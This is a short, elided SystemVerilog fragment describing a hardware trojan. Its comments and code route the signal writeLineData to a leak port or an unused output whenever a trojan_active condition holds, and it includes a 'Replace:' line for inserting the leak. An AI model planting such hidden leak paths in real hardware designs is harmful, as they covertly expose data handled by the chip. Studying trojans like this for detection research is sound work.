 ...
 * Payload: Route writeLineData to leak port
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        trojan_leak_data <= writeLineData;
    end
end
...
// ============================================================
// Information Leak: Route writeLineData to unused output
//
...
//   Replace: assign output_signal = trojan_active ? writeLineData : normal_value;